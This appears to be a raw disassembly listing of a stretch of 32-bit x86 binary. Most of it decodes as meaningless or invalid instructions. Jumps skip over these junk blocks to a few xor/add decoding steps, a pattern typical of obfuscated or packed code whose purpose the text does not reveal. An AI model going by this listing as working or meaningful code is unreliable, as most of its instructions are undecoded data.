  40be8b:	out    0x36,eax
  40be8d:	pop    esi
  40be8e:	pop    ss
  40be8f:	xor    ecx,DWORD PTR [eax+0x22c5ccd5]
  40be95:	arpl   WORD PTR [edx+0x55],bx
  40be98:	jmp    0xd227:0xa22dde5b
  40be9f:	adc    DWORD PTR [eax],edx
  40bea1:	(bad)  
  40bea2:	and    dl,BYTE PTR [esi+eax*1-0x35]
  40bea6:	or     DWORD PTR [ecx+0x4f],eax
  40bea9:	fisubr DWORD PTR [edx+0x78]
  40beac:	inc    ecx
  40bead:	jns    0x40be8b
  40beaf:	push   ebp
  40beb0:	sbb    al,BYTE PTR [ecx+0x11]
  40beb3:	lods   eax,DWORD PTR ds:[esi]
  40beb4:	jmp    0x9cf0:0xc23f20c
  40bebb:	cmp    al,0xdf
  40bebd:	aam    0x44
  40bebf:	dec    ch
  40bec1:	xchg   esi,eax
  40bec2:	adc    cl,dl
  40bec4:	jo     0x40bf11
  40bec6:	ret    0x619c
  40bec9:	fs fst st(1)
  40becc:	pop    edi
  40becd:	push   0xffffffb8
  40becf:	mov    dl,ch
  40bed1:	mov    ah,0x65
  40bed3:	loope  0x40be68
  40bed5:	inc    ecx
  40bed6:	out    0xd0,eax
  40bed8:	add    bl,dh
  40beda:	xchg   BYTE PTR [esi],bl
  40bedc:	jecxz  0x40bec9
  40bede:	stos   BYTE PTR es:[edi],al
  40bedf:	shl    BYTE PTR [edi+eax*2],1
  40bee2:	js     0x40beba
  40bee4:	mov    BYTE PTR [edx+0x1c059c7c],bl
  40beea:	in     eax,0x9e
  40beec:	pop    edx
  40beed:	dec    eax
  40beee:	out    0x9d,eax
  40bef0:	gs repnz pop edx
  40bef3:	or     DWORD PTR [edx+eax*2+0x68079cee],ebp
  40befa:	in     eax,dx
  40befb:	jbe    0x40beec
  40befd:	sbb    al,0xcf
  40beff:	sbb    al,0x4b
  40bf01:	sub    ecx,DWORD PTR [ebx]
  40bf03:	es call 0x6d93:0xed935c63
  40bf0b:	fsub   DWORD PTR [ebx+0x6a]
  40bf0e:	adc    dh,al
  40bf10:	test   DWORD PTR [edi+0x6f54b51e],ebp
  40bf16:	mov    al,ds:0xc84416a2
  40bf1b:	call   0x1076:0xcd548d6b
  40bf22:	ror    DWORD PTR [ebx],1
  40bf24:	adc    al,BYTE PTR [ecx-0xd]
  40bf27:	sbb    BYTE PTR fs:[ebp+0x3d39eb5],al
  40bf2e:	or     ebx,DWORD PTR [edi+ecx*4+0x3e]
  40bf32:	and    al,0x65
  40bf34:	or     eax,0xf95f169a
  40bf39:	mov    ds:0xf4615cb7,al
  40bf3e:	push   ecx
  40bf3f:	rcr    DWORD PTR [ebx],0x1c
  40bf42:	pop    ds
  40bf43:	jbe    0x40bfb2
  40bf45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf46:	xchg   ebp,eax
  40bf47:	in     eax,0x5c
  40bf49:	push   esp
  40bf4a:	inc    edx
  40bf4b:	push   edi
  40bf4c:	lock add cl,bl
  40bf4f:	into   
  40bf50:	sbb    bh,al
  40bf52:	jo     0x40bfa6
  40bf54:	call   0xf29a:0x55a0a54a
  40bf5b:	pop    edx
  40bf5c:	loope  0x40bf1a
  40bf5e:	cld    
  40bf5f:	xchg   bh,dl
  40bf61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf62:	out    dx,al
  40bf63:	xchg   ebp,eax
  40bf64:	mov    eax,0x256e0e4f
  40bf69:	dec    ebx
  40bf6a:	rcr    DWORD PTR [esi+0x452b9952],1
  40bf70:	js     0x40bf7d
  40bf72:	mov    ds:0x979c8e92,eax
  40bf77:	dec    ecx
  40bf78:	and    al,0x8b
  40bf7a:	cli    
  40bf7b:	cmp    eax,0xdcb5358c
  40bf80:	push   0x8b931c3d
  40bf85:	jge    0x40bf8f
  40bf87:	mov    edi,DWORD PTR [edi]
  40bf89:	mov    edx,0x8a36
  40bf8e:	xor    ax,dx
  40bf91:	mov    edx,0x3afc
  40bf96:	add    ax,dx
  40bf99:	cmp    ax,WORD PTR [edi]
  40bf9c:	je     0x40c934
  40bfa2:	mov    eax,DWORD PTR [ebp-0x14]
  40bfa5:	xor    eax,ecx
  40bfa7:	add    eax,esi
  40bfa9:	mov    DWORD PTR [ebp-0x24],eax
  40bfac:	jmp    0x40c2c5
  40bfb1:	int3   
  40bfb2:	into   
  40bfb3:	retf   
  40bfb4:	ror    cl,1
  40bfb6:	(bad)  
  40bfb8:	ficom  DWORD PTR [edi+ebx*4+0x6c]
  40bfbc:	cmc    
  40bfbd:	in     al,0x4
  40bfbf:	push   ebx
  40bfc0:	sar    BYTE PTR [esi],1
  40bfc2:	xchg   esi,eax
  40bfc3:	js     0x40c03d
  40bfc5:	je     0x40c045
  40bfc7:	js     0x40c041
  40bfc9:	stc    
  40bfca:	(bad)  
  40bfcb:	jl     0x40bf62
  40bfcd:	popf   
  40bfce:	inc    esi
  40bfcf:	and    esi,DWORD PTR [eax+0x70]
  40bfd2:	pop    es
  40bfd3:	add    ecx,DWORD PTR [edx]
  40bfd5:	bound  edx,QWORD PTR [esi+esi*2]
  40bfd8:	sbb    esi,DWORD PTR [ebp+ebx*1+0x3e]
  40bfdc:	cmp    eax,0xfc1f6ed4
  40bfe1:	cmp    eax,DWORD PTR [esi]
  40bfe3:	stc    
  40bfe4:	fldcw  WORD PTR [esi+0x543bdcd6]
  40bfea:	push   0x5c4fdd54
  40bfef:	iret   
  40bff0:	ds xchg ebx,eax
  40bff2:	das    
  40bff3:	push   edx
  40bff4:	mov    esi,DWORD PTR [eax]
  40bff6:	call   DWORD PTR [esi]
  40bff8:	mov    edx,0xd8165ca8
  40bffd:	in     eax,dx
  40bffe:	test   al,0x8c
  40c000:	adc    ch,bl
  40c002:	mov    BYTE PTR [ecx],bh
  40c004:	sub    dl,BYTE PTR [ecx+0x7f5e5799]
  40c00a:	pushf  
  40c00b:	xor    al,0x70
  40c00d:	mov    bl,0x1f
  40c00f:	test   al,0x5
  40c011:	gs ret 0x82b6
  40c015:	stos   DWORD PTR es:[edi],eax
  40c016:	enter  0x3ccd,0x6c
  40c01a:	sti    
  40c01b:	xor    edx,edi
  40c01d:	adc    ebp,DWORD PTR [edx+0x50]
  40c020:	test   eax,0xb4167e91
  40c025:	bound  edi,QWORD PTR [eax+0x35]
  40c028:	pop    esi
  40c029:	mov    edx,0xb0cf1c38
  40c02e:	mov    dl,0x5e
  40c030:	push   cs
  40c031:	mov    cs,WORD PTR [edi-0x5b]
  40c034:	mov    BYTE PTR [ebx-0x6521fcf7],cl
  40c03a:	or     al,dh
  40c03c:	(bad)  
  40c03d:	bound  ebx,QWORD PTR [ecx-0x7ee06a08]
  40c043:	xor    DWORD PTR [eax-0x6da1614f],eax
  40c049:	and    bl,dh
  40c04b:	mov    edx,0x356c7e5c
  40c050:	add    eax,0x553ee4ca
  40c055:	xor    esp,ebp
  40c057:	mov    ebx,0x5849a201
  40c05c:	sbb    ah,cl
  40c05e:	lock test BYTE PTR [ecx+0x8],dh
  40c062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c063:	sub    DWORD PTR [esi+0x5a28cbb1],esp
  40c069:	(bad)  
  40c06a:	mov    edi,0x542416aa
  40c06f:	or     BYTE PTR [edi],al
  40c071:	add    eax,0x63ff03bd
  40c076:	les    esp,FWORD PTR [ebp-0x540a907b]
  40c07c:	ds sub al,0xda
  40c07f:	fild   WORD PTR [edx+0x61c10bfd]
  40c085:	rcl    BYTE PTR [ebx+0xdaafe3a],cl
  40c08b:	sub    ebp,DWORD PTR [ecx+0x19]
  40c08e:	inc    eax
  40c08f:	sub    DWORD PTR [eax],edx
  40c091:	adc    DWORD PTR [edx-0x36ba6267],ecx
  40c097:	pusha  
  40c098:	cmp    DWORD PTR [edx-0x899413b],esp
  40c09e:	adc    BYTE PTR [ebx+0x633a75ec],dh
  40c0a4:	ss pop edi
  40c0a6:	out    0x9a,al
  40c0a8:	sub    ch,al
  40c0aa:	push   ss
  40c0ab:	loope  0x40c108
  40c0ad:	mov    esi,0x3428a5ca
  40c0b2:	sub    edx,DWORD PTR [edx-0x78212a31]
  40c0b8:	jmp    0x40c121
  40c0ba:	retf   
  40c0bb:	enter  0xe55b,0xf4
  40c0bf:	push   edx
  40c0c0:	addr16 test al,0xd0
  40c0c3:	dec    esp
  40c0c4:	mov    BYTE PTR [edx],cl
  40c0c6:	push   esp
  40c0c7:	pop    edi
  40c0c8:	cmp    DWORD PTR [eax+0x3e],ecx
  40c0cb:	imul   ecx,ebp,0x20e62e4d
  40c0d1:	fisttp DWORD PTR [edx-0x45b40955]
  40c0d7:	jae    0x40c081
  40c0d9:	aam    0xd0
  40c0db:	(bad)  
  40c0dc:	fbld   TBYTE PTR [edx-0x47]
  40c0df:	mov    al,ds:0x834e0186
  40c0e4:	mov    al,ds:0x50687163
  40c0e9:	sub    eax,0x3ac0499a
  40c0ee:	rol    BYTE PTR [bp+si-0x44],0xc8
  40c0f3:	mov    esp,0xa258535f
  40c0f8:	push   esp
  40c0f9:	fdivr  st(4),st
  40c0fb:	inc    eax
  40c0fc:	repz mov dh,0x3
  40c0ff:	shl    BYTE PTR [esi-0x7530db4a],cl
  40c105:	sti    
  40c106:	inc    edx
  40c107:	dec    esp
  40c108:	fidivr DWORD PTR [ecx]
  40c10a:	fnsave [esi]
  40c10c:	leave  
  40c10d:	mov    ds:0x5920607c,al
  40c112:	xchg   edx,eax
  40c113:	int    0xc
  40c115:	xchg   esi,eax
  40c116:	int    0xcd
  40c118:	push   eax
  40c119:	jb     0x40c141
  40c11b:	and    eax,0x4251cf48
  40c120:	add    ah,BYTE PTR [edi-0x67]
  40c123:	js     0x40c0ab
  40c125:	into   
  40c126:	mov    cl,0xf7
  40c128:	sbb    BYTE PTR [esi+0x5239d6b8],ch
  40c12e:	xor    al,0x53
  40c130:	test   bh,ch
  40c132:	and    al,0xd2
  40c134:	adc    al,0xd4
  40c136:	js     0x40c1a5
  40c138:	add    al,0x77
  40c13a:	sti    
  40c13b:	xchg   ebx,eax
  40c13c:	xchg   ecx,eax
  40c13d:	xchg   edi,eax
  40c13e:	hlt    
  40c13f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c140:	pop    ebp
  40c141:	cli    
  40c142:	pusha  
  40c143:	fdiv   DWORD PTR [ebx+0x4a]
  40c146:	fistp  WORD PTR [edx]
  40c148:	mov    al,BYTE PTR [edx]
  40c14a:	inc    edi
  40c14b:	shr    bh,cl
  40c14d:	push   esi
  40c14e:	test   al,0x14
  40c150:	in     al,0x65
  40c152:	xchg   DWORD PTR [edx-0x2a],edx
  40c155:	mov    BYTE PTR [edx-0x684e62cc],bh
  40c15b:	xlat   BYTE PTR ds:[ebx]
  40c15c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c15d:	addr16 adc edi,edi
  40c160:	sub    al,0x44
  40c162:	push   0xbecd4d62
  40c167:	cmp    eax,0x482fda2b
  40c16c:	rcl    DWORD PTR [ecx],1
  40c16e:	pop    ds
  40c16f:	jmp    0x28a8:0xad34df0a
  40c176:	adc    ebp,edi
  40c178:	dec    edi
  40c179:	aaa    
  40c17a:	inc    edx
  40c17b:	mov    DWORD PTR [ecx+0x102d459d],esi
  40c181:	outs   dx,BYTE PTR ds:[esi]
  40c182:	xor    ebx,DWORD PTR [eax+ebp*2]
  40c185:	sub    DWORD PTR [ebx+0x77],esp
  40c188:	rcr    BYTE PTR [ebx-0x2d7afc3],cl
  40c18e:	cmp    ch,BYTE PTR [eax-0x673749b2]
  40c194:	nop
  40c195:	out    dx,eax
  40c196:	iret   
  40c197:	enter  0xd7f2,0x86
  40c19b:	fiadd  WORD PTR [edx+0xc623faa]
  40c1a1:	fwait
  40c1a2:	inc    ebp
  40c1a3:	add    BYTE PTR [esi],bl
  40c1a5:	inc    eax
  40c1a6:	adc    ecx,DWORD PTR [edx+0x8]
  40c1a9:	out    dx,eax
  40c1aa:	xchg   esp,eax
  40c1ab:	push   esi
  40c1ac:	lds    edx,FWORD PTR [edi+0x1e]
  40c1af:	push   cs
  40c1b0:	jno    0x40c231
  40c1b2:	adc    DWORD PTR [ebp+0xd],ecx
  40c1b5:	xor    ebx,DWORD PTR [eax+0x35]
  40c1b8:	int    0x25
  40c1ba:	fwait
  40c1bb:	mov    dl,0x2a
  40c1bd:	pop    ss
  40c1be:	jp     0x40c17e
  40c1c0:	loopne 0x40c1ec
  40c1c2:	jo     0x40c1cf
  40c1c4:	bound  esi,QWORD PTR [edx-0x52]
  40c1c7:	pop    ds
  40c1c8:	jge    0x40c194
  40c1ca:	and    ch,BYTE PTR [edx+0x5c515cc5]
  40c1d0:	fidiv  DWORD PTR [ebp-0x73d8fa9d]
  40c1d6:	call   0x34cc:0x53dd6eae
  40c1dd:	int    0x29
  40c1df:	xor    al,0x4a
  40c1e1:	aam    0xdf
  40c1e3:	test   BYTE PTR [edx+0x7f3de1a9],cl
  40c1e9:	dec    ebx
  40c1ea:	push   0x8d9154dd
  40c1ef:	(bad)  
  40c1f0:	outs   dx,DWORD PTR ds:[esi]
  40c1f1:	mov    bh,0x3
  40c1f3:	ss leave 
  40c1f5:	fmulp  st(7),st
  40c1f7:	adc    BYTE PTR ds:0xff835a35,bh
  40c1fd:	inc    edx
  40c1fe:	(bad)  
  40c1ff:	pop    esi
  40c200:	icebp  
  40c201:	lea    edx,[esi+0x5854fd4e]
  40c207:	lock push cs
  40c209:	dec    esi
  40c20a:	jp     0x40c1b7
  40c20c:	mov    ds,WORD PTR [ebp+0x7cac0151]
  40c212:	xchg   esi,eax
  40c213:	mov    ecx,0xacac7c3e
  40c218:	ds xchg esi,esi
  40c21b:	push   ecx
  40c21c:	cwde   
  40c21d:	mov    esi,0x6ce3b9cb
  40c222:	mov    ecx,0x22cf0a1e
  40c227:	jge    0x40c286
  40c229:	out    dx,al
  40c22a:	in     al,0xf8
  40c22c:	test   eax,0x4eb74cad
  40c231:	sahf   
  40c232:	out    dx,eax
  40c233:	mov    ch,BYTE PTR [esi]
  40c235:	jge    0x40c250
  40c237:	or     al,0x7d
  40c239:	jo     0x40c272
  40c23b:	aam    0xdf
  40c23d:	repz ret 
  40c23f:	ret    0xae05
  40c242:	jnp    0x40c2b8
  40c244:	enter  0xff80,0xab
  40c248:	or     ch,BYTE PTR [edi-0x75e8db41]
  40c24e:	fwait
  40c24f:	add    al,0x6e
  40c251:	jne    0x40c1e0
  40c253:	shl    BYTE PTR [ecx+0x17],0xb4
  40c257:	cmp    ebp,DWORD PTR [esp]
  40c25a:	add    ebx,DWORD PTR [edi]
  40c25c:	jnp    0x40c22e
  40c25e:	out    0xc,eax
  40c260:	loop   0x40c2be
  40c262:	fcmovne st,st(2)
  40c264:	gs xchg ecx,eax
  40c266:	push   0xcc0a0331
  40c26b:	mov    bh,0x3a
  40c26d:	aad    0xb1
  40c26f:	dec    ecx
  40c270:	dec    edi
  40c271:	div    cl
  40c273:	aaa    
  40c274:	inc    edx
  40c275:	inc    esi
  40c276:	addr16 out 0x60,eax
  40c279:	addr16 ds or eax,0xf4fa2713
  40c280:	mov    al,ds:0x4ce0d55b
  40c285:	ret    
  40c286:	jp     0x40c22b
  40c288:	mov    edi,0x8264e225
  40c28d:	or     eax,0x7e9baf29
  40c292:	fucomip st,st(4)
  40c294:	mov    BYTE PTR [ebx+edi*2+0x25],al
  40c298:	xchg   ebp,eax
  40c299:	sbb    DWORD PTR [ecx-0x643e956f],ebx
  40c29f:	mov    ds:0x5108cad9,eax
  40c2a4:	jae    0x40c2a0
  40c2a6:	aad    0xdf
  40c2a8:	jecxz  0x40c28a
  40c2aa:	popa   
  40c2ab:	push   0xe0b1d9da
  40c2b0:	scas   al,BYTE PTR es:[edi]
  40c2b1:	add    ebp,esi
  40c2b3:	jne    0x40c320
  40c2b5:	lea    ebp,[edi+0x4d]
  40c2b8:	push   edx
  40c2b9:	mov    eax,ds:0x4172cd9c
  40c2be:	loop   0x40c338
  40c2c0:	out    dx,eax
  40c2c1:	stos   DWORD PTR es:[edi],eax
  40c2c2:	loop   0x40c289
  40c2c4:	pop    ebp
  40c2c5:	mov    eax,DWORD PTR [ebp-0x28]
  40c2c8:	mov    di,WORD PTR [ebp-0x2c]
  40c2cc:	mov    ebx,0x8a36
  40c2d1:	jmp    0x40c5ea
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	cmp    al,0xc4
  40c2d9:	ds fcmovnb st,st(6)
  40c2dc:	(bad)  
  40c2de:	js     0x40c267
  40c2e0:	adc    BYTE PTR [eax-0x51],bh
  40c2e3:	rol    BYTE PTR [ebp+0x789b3a88],cl
  40c2e9:	js     0x40c35f
  40c2eb:	jle    0x40c365
  40c2ed:	js     0x40c270
  40c2ef:	jns    0x40c2f1
  40c2f1:	retf   
  40c2f2:	sub    eax,0x647a3e6d
  40c2f7:	enter  0xe082,0x8e
  40c2fb:	and    al,0x35
  40c2fd:	or     DWORD PTR [eax+0x2],esi
  40c300:	shr    BYTE PTR [edx+esi*1+0x14],0xc6
  40c305:	jmp    0x42c4871a
  40c30a:	adc    cl,dl
  40c30c:	sti    
  40c30d:	jmp    0x40c352
  40c30f:	arpl   WORD PTR [ebx+0x39],bp
  40c312:	push   esp
  40c313:	jns    0x40c2b7
  40c315:	cmp    BYTE PTR [edx+0x39],ch
  40c318:	ss aas 
  40c31a:	or     esi,eax
  40c31c:	add    esp,ecx
  40c31e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c31f:	push   ebp
  40c320:	fmul   QWORD PTR [ebx-0x5]
  40c323:	arpl   WORD PTR [edx],cx
  40c325:	xchg   bh,ah
  40c327:	mov    BYTE PTR [edi+0x29],dh
  40c32a:	cmp    eax,0x4de5a42f
  40c32f:	cdq    
  40c330:	fld    TBYTE PTR ds:0x31838d87
  40c336:	push   cs
  40c337:	into   
  40c338:	push   ebp
  40c339:	rcr    esi,1
  40c33b:	imul   esp
  40c33d:	ds lahf 
  40c33f:	mov    bl,ch
  40c341:	fistp  DWORD PTR [edx+0x463f99b8]
  40c347:	inc    ebx
  40c348:	fstp   DWORD PTR [edx+edi*2+0x65]
  40c34c:	pop    edi
  40c34d:	add    esp,DWORD PTR [edx-0x1739aea7]
  40c353:	cs mov esp,0x74adc8e2
  40c359:	xor    DWORD PTR [esi-0x77],edx
  40c35c:	(bad)  
  40c35d:	jle    0x40c3a4
  40c35f:	fnstenv [edx-0x5c]
  40c362:	dec    esp
  40c363:	popf   
  40c364:	clc    
  40c365:	inc    eax
  40c366:	mov    ds:0x7e232582,eax
  40c36b:	outs   dx,DWORD PTR ds:[esi]
  40c36c:	sub    eax,0xead51aa
  40c371:	mul    DWORD PTR [edi]
  40c373:	pop    eax
  40c374:	xchg   ecx,eax
  40c375:	mov    esi,DWORD PTR [edi+0x3e017847]
  40c37b:	mov    cl,0x9d
  40c37d:	enter  0x903c,0xdd
  40c381:	out    dx,eax
  40c382:	xchg   BYTE PTR [ecx-0x2d],bh
  40c385:	adc    BYTE PTR [ecx+edx*4-0x26],dh
  40c389:	ds addr16 and al,0x38
  40c38d:	stos   DWORD PTR es:[edi],eax
  40c38e:	aaa    
  40c38f:	sub    ch,BYTE PTR ds:0xa0b2db65
  40c395:	cmp    ebx,DWORD PTR [ecx-0x69531c37]
  40c39b:	or     eax,0x7bece216
  40c3a0:	pop    ebx
  40c3a1:	out    0x7a,al
  40c3a3:	(bad)  
  40c3a4:	mov    cs,WORD PTR [eax]
  40c3a6:	mov    ss,edi
  40c3a8:	jp     0x40c382
  40c3aa:	and    ebp,DWORD PTR [esi]
  40c3ac:	lock mov dx,0x66ff
  40c3b1:	mov    ecx,0x1bc87891
  40c3b6:	or     DWORD PTR [ecx-0x57],0x6f
  40c3ba:	pop    DWORD PTR [esi-0x3d1a6f0f]
  40c3c0:	xor    eax,0x96db94c2
  40c3c5:	jne    0x40c3c5
  40c3c7:	(bad)  
  40c3c9:	aas    
  40c3ca:	inc    edi
  40c3cb:	pop    esi
  40c3cc:	jbe    0x40c363
  40c3ce:	fstp   TBYTE PTR [edi-0x66]
  40c3d1:	leave  
  40c3d2:	sub    ebx,DWORD PTR [esp+eax*4-0x465ff68b]
  40c3d9:	mov    bh,BYTE PTR [edi]
  40c3db:	add    ebp,DWORD PTR [eax-0x1b]
  40c3de:	push   ebp
  40c3df:	xor    al,0x7d
  40c3e1:	sbb    BYTE PTR ss:[edx],al
  40c3e4:	sbb    DWORD PTR [eax-0x19],0xffffff92
  40c3e8:	stos   DWORD PTR es:[edi],eax
  40c3e9:	jmp    0x40c43a
  40c3eb:	pop    ds
  40c3ec:	jnp    0x40c425
  40c3ee:	ja     0x40c418
  40c3f0:	iret   
  40c3f1:	mov    ebx,0xc2d7d769
  40c3f6:	push   ebx
  40c3f7:	jg     0x40c3cd
  40c3f9:	in     eax,dx
  40c3fa:	push   edi
  40c3fb:	adc    BYTE PTR [ebx+0x548a09dc],ah
  40c401:	or     cl,BYTE PTR [edi]
  40c403:	xor    al,0x3f
  40c405:	adc    ah,BYTE PTR [eax-0x5517f2e0]
  40c40b:	inc    ebp
  40c40c:	pop    di
  40c40e:	dec    BYTE PTR [edx-0xa]
  40c411:	daa    
  40c412:	cmp    eax,0xe44f1d99
  40c417:	jo     0x40c3c6
  40c419:	adc    BYTE PTR [ecx+ebp*1],0x1f
  40c41d:	cmp    bh,BYTE PTR [edi-0x477c407a]
  40c423:	test   DWORD PTR [eax],eax
  40c425:	sbb    eax,0x9da5b872
  40c42a:	scas   al,BYTE PTR es:[edi]
  40c42b:	in     al,0xef
  40c42d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c42e:	fld    QWORD PTR [edi+0x7b]
  40c431:	dec    eax
  40c432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c433:	add    ebp,DWORD PTR [edx]
  40c435:	cmc    
  40c436:	push   esp
  40c437:	(bad)  
  40c438:	scas   al,BYTE PTR es:[edi]
  40c439:	mov    ds:0x7e3ae9d2,al
  40c43e:	cld    
  40c43f:	test   al,0x9a
  40c441:	ins    BYTE PTR es:[edi],dx
  40c442:	(bad)  
  40c443:	in     eax,0x7f
  40c445:	xchg   esp,eax
  40c446:	jne    0x40c4b4
  40c448:	cmp    dl,BYTE PTR [esi]
  40c44a:	pop    ebp
  40c44b:	jle    0x40c4a7
  40c44d:	push   ds
  40c44e:	icebp  
  40c44f:	pushf  
  40c450:	push   esi
  40c451:	sbb    eax,0x2d7150ee
  40c456:	out    0x6e,al
  40c458:	mov    esi,ecx
  40c45a:	or     al,BYTE PTR [ecx]
  40c45c:	mov    al,ds:0x55ac1941
  40c461:	rcl    BYTE PTR [ecx],cl
  40c463:	repnz mov dh,0xaf
  40c466:	and    DWORD PTR [esi+ecx*2],esp
  40c469:	call   0x7228:0xf86b55e7
  40c470:	outs   dx,DWORD PTR ds:[esi]
  40c471:	retf   
  40c472:	cmp    edi,DWORD PTR [ebx+0x48]
  40c475:	call   0x896aa7b7
  40c47a:	outs   dx,DWORD PTR ds:[esi]
  40c47b:	(bad)  
  40c47c:	jmp    0xf24140ef
  40c481:	gs repnz stos BYTE PTR es:[edi],al
  40c484:	push   eax
  40c485:	sar    BYTE PTR [esi+0x628eb1a5],cl
  40c48b:	jbe    0x40c456
  40c48d:	les    esp,FWORD PTR [edi-0x716e5280]
  40c493:	xchg   esp,eax
  40c494:	cmp    BYTE PTR [ebx+0x7],bh
  40c497:	shl    BYTE PTR [ecx-0x57],cl
  40c49a:	fnstcw WORD PTR [edx+0x66]
  40c49d:	sti    
  40c49e:	adc    al,0x5
  40c4a0:	cmc    
  40c4a1:	aad    0x55
  40c4a3:	jns    0x40c4b5
  40c4a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4a6:	dec    ecx
  40c4a7:	mov    bl,BYTE PTR [edx+ebp*4]
  40c4aa:	dec    edx
  40c4ab:	cmc    
  40c4ac:	btr    DWORD PTR [esp+eax*8+0x12],edx
  40c4b1:	jnp    0x40c487
  40c4b3:	push   ecx
  40c4b4:	mov    dl,0x17
  40c4b6:	lods   eax,DWORD PTR ds:[esi]
  40c4b7:	pop    ecx
  40c4b8:	mov    fs,WORD PTR [esi]
  40c4ba:	call   0xc1e2:0x906a6a86
  40c4c1:	mov    bl,0xbb
  40c4c3:	mov    edi,0xeb22580a
  40c4c8:	cmp    BYTE PTR [ecx],ch
  40c4ca:	mov    bl,0x51
  40c4cc:	push   esi
  40c4cd:	dec    ebp
  40c4ce:	adc    BYTE PTR [ebx+ebx*8+0x496986d],ch
  40c4d5:	add    al,0x2a
  40c4d7:	fcom   DWORD PTR [ecx-0x7e]
  40c4da:	or     DWORD PTR [edx-0x49],ebp
  40c4dd:	in     al,0xe9
  40c4df:	mov    edi,0x543ecac4
  40c4e4:	sub    al,0x88
  40c4e6:	ins    DWORD PTR es:[edi],dx
  40c4e7:	aam    0x75
  40c4e9:	jp     0x40c566
  40c4eb:	mov    esi,0xe8259f56
  40c4f0:	(bad)  
  40c4f1:	enter  0x8eaf,0x35
  40c4f5:	not    DWORD PTR [ecx+0x4975c281]
  40c4fb:	into   
  40c4fc:	fwait
  40c4fd:	cwde   
  40c4fe:	pop    esp
  40c4ff:	addr16 je 0x40c4ca
  40c502:	and    DWORD PTR [ebp-0x52],0x24
  40c506:	or     bl,bh
  40c508:	pop    esi
  40c509:	icebp  
  40c50a:	fs test al,0x99
  40c50d:	push   cs
  40c50e:	fs dec eax
  40c510:	sub    DWORD PTR [eax-0x5c25ecfc],eax
  40c516:	inc    edi
  40c517:	scas   eax,DWORD PTR es:[edi]
  40c518:	in     eax,0xbf
  40c51a:	push   ds
  40c51b:	lea    ecx,[eax+esi*8]
  40c51e:	push   ds
  40c51f:	xor    esp,eax
  40c521:	rol    BYTE PTR [edx-0x6aed629a],1
  40c527:	sbb    DWORD PTR [eax],ebx
  40c529:	xchg   edx,eax
  40c52a:	inc    ebx
  40c52b:	stos   DWORD PTR es:[edi],eax
  40c52c:	pop    esp
  40c52d:	push   ds
  40c52e:	stos   DWORD PTR es:[edi],eax
  40c52f:	into   
  40c530:	mov    eax,ds:0xb31fc7ef
  40c535:	add    ebx,DWORD PTR [esi+ecx*1]
  40c538:	in     eax,dx
  40c539:	hlt    
  40c53a:	cli    
  40c53b:	sub    esi,ecx
  40c53d:	dec    ebp
  40c53e:	dec    esp
  40c53f:	test   BYTE PTR [eax+0x7a],ch
  40c542:	ins    DWORD PTR es:[edi],dx
  40c543:	mov    edx,0xae9cac11
  40c548:	lods   eax,DWORD PTR ds:[esi]
  40c549:	leave  
  40c54a:	push   esi
  40c54b:	test   DWORD PTR [edx+eax*2],esp
  40c54e:	mov    ebp,0xf6e233d7
  40c553:	daa    
  40c554:	fstp   TBYTE PTR [edi-0x61]
  40c557:	pusha  
  40c558:	pop    edi
  40c559:	adc    ecx,DWORD PTR [esi+0x79]
  40c55c:	sub    ch,BYTE PTR [ebp+0x107cecee]
  40c562:	ja     0x40c4fd
  40c564:	pusha  
  40c565:	sbb    BYTE PTR [ebx+ebp*2+0x50],dl
  40c569:	add    DWORD PTR [ecx+0x7a60b87b],ebp
  40c56f:	add    eax,0x5ec74463
  40c574:	xor    DWORD PTR [eax-0x64],eax
  40c577:	push   es
  40c578:	push   cs
  40c579:	mov    ah,bh
  40c57b:	add    ch,BYTE PTR cs:[ebx+esi*2+0x4acbc89f]
  40c583:	pop    ecx
  40c584:	int3   
  40c585:	int3   
  40c586:	mov    bh,BYTE PTR [ebx]
  40c588:	lea    esi,[esi+edx*8]
  40c58b:	lds    edx,FWORD PTR [edx]
  40c58d:	aaa    
  40c58e:	push   eax
  40c58f:	arpl   WORD PTR [esi+0x43],cx
  40c592:	cld    
  40c593:	aas    
  40c594:	xchg   BYTE PTR [ebp+0x43],bh
  40c597:	inc    ebx
  40c598:	push   ss
  40c599:	push   ss
  40c59a:	popf   
  40c59b:	push   esi
  40c59c:	sar    ebx,0xd2
  40c59f:	(bad)  
  40c5a0:	aaa    
  40c5a1:	fidiv  WORD PTR [edx+0x6e]
  40c5a4:	or     eax,DWORD PTR [edx+0x20bd0cce]
  40c5aa:	xor    dh,BYTE PTR [ecx+0x9]
  40c5ad:	or     eax,0x5310bd9b
  40c5b2:	pop    esi
  40c5b3:	jge    0x40c62f
  40c5b5:	mov    edx,0x4216cd2d
  40c5ba:	int    0xf4
  40c5bc:	sub    al,0xd7
  40c5be:	mov    BYTE PTR [ecx-0x1b],bh
  40c5c1:	ins    BYTE PTR es:[edi],dx
  40c5c2:	lods   al,BYTE PTR ds:[esi]
  40c5c3:	jbe    0x40c611
  40c5c5:	in     al,0xc8
  40c5c7:	mov    ebx,0x6b7b0ed9
  40c5cc:	mov    edx,0x71b66b5
  40c5d1:	mov    esp,0x13542d58
  40c5d6:	cmc    
  40c5d7:	or     ebx,ebp
  40c5d9:	int3   
  40c5da:	xchg   ecx,eax
  40c5db:	xor    dh,ch
  40c5dd:	sbb    dl,BYTE PTR [eax+0x59]
  40c5e0:	cs mov ebp,0xddd184ba
  40c5e6:	stc    
  40c5e7:	(bad)  
  40c5e8:	addr16 sahf 
  40c5ea:	xor    di,bx
  40c5ed:	add    di,dx
  40c5f0:	movzx  edx,di
  40c5f3:	mov    edi,DWORD PTR [ebp-0x8]
  40c5f6:	xor    edi,ecx
  40c5f8:	lea    edx,[edx+edi*1+0x327298]
  40c5ff:	add    DWORD PTR [eax],edx
  40c601:	jmp    0x40c91a
  40c606:	cmp    eax,0xd9d2c1d7
  40c60b:	fcmove st,st(5)
  40c60d:	(bad)  ds:0x4d2d2f7
  40c613:	inc    edi
  40c614:	lods   al,BYTE PTR ds:[esi]
  40c615:	in     eax,0x36
